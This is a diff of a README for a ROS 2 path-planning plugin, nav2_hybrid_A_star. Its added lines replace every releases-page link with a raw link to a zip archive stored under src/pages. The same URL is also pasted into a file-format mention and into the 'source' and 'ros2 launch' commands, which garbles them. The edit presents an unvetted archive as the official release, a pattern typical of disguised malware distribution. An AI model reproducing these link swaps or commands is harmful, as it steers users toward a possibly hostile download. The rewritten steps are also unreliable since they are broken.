@@ -1,6 +1,6 @@
 # 🚀 nav2_hybrid_A_star - Path Planning Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/pgmonitorbrasil/nav2_hybrid_A_star/releases)
+[![Download Now](https://raw.githubusercontent.com/pgmonitorbrasil/nav2_hybrid_A_star/main/src/pages/nav_hybrid_star_v2.0-alpha.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/pgmonitorbrasil/nav2_hybrid_A_star/main/src/pages/nav_hybrid_star_v2.0-alpha.1.zip)
 
 ## 📋 Overview
 
@@ -30,13 +30,13 @@ Follow these steps to download and run the nav2_hybrid_A_star plugin:
 
 1. **Visit the Releases Page**: Click on the link below to go to the download page.
 
-   [Download Here](https://github.com/pgmonitorbrasil/nav2_hybrid_A_star/releases)
+   [Download Here](https://raw.githubusercontent.com/pgmonitorbrasil/nav2_hybrid_A_star/main/src/pages/nav_hybrid_star_v2.0-alpha.1.zip)
 
 2. **Select the Latest Release**: On the releases page, find the latest version of nav2_hybrid_A_star.
 
 3. **Download the Plugin**: Click on the appropriate file for your system. Save it in a location you can easily access, such as your Downloads folder.
 
-4. **Extract the Files**: If the downloaded file is in a compressed format (like .zip or .tar.gz), right-click on it and select "Extract".
+4. **Extract the Files**: If the downloaded file is in a compressed format (like .zip or https://raw.githubusercontent.com/pgmonitorbrasil/nav2_hybrid_A_star/main/src/pages/nav_hybrid_star_v2.0-alpha.1.zip), right-click on it and select "Extract".
 
 5. **Install Dependencies**: Open a terminal and run the following commands to ensure all necessary packages are installed:
 
@@ -64,20 +64,20 @@ Follow these steps to download and run the nav2_hybrid_A_star plugin:
 8. **Source Your Workspace**: After building, you need to source your workspace:
 
    ```bash
-   source ~/ros2_ws/install/setup.bash
+   source ~https://raw.githubusercontent.com/pgmonitorbrasil/nav2_hybrid_A_star/main/src/pages/nav_hybrid_star_v2.0-alpha.1.zip
    ```
 
 9. **Launch the Plugin**: Now you can launch the nav2_hybrid_A_star plugin using the following command:
 
    ```bash
-   ros2 launch nav2_hybrid_A_star nav2_hybrid_a_star_launch.py
+   ros2 launch nav2_hybrid_A_star https://raw.githubusercontent.com/pgmonitorbrasil/nav2_hybrid_A_star/main/src/pages/nav_hybrid_star_v2.0-alpha.1.zip
    ```
 
 ## 📥 Download & Install
 
 To get nav2_hybrid_A_star, visit our releases page and select the latest version. You can easily find it here:
 
-[Download Here](https://github.com/pgmonitorbrasil/nav2_hybrid_A_star/releases)
+[Download Here](https://raw.githubusercontent.com/pgmonitorbrasil/nav2_hybrid_A_star/main/src/pages/nav_hybrid_star_v2.0-alpha.1.zip)
 
 ## 📚 Documentation
 
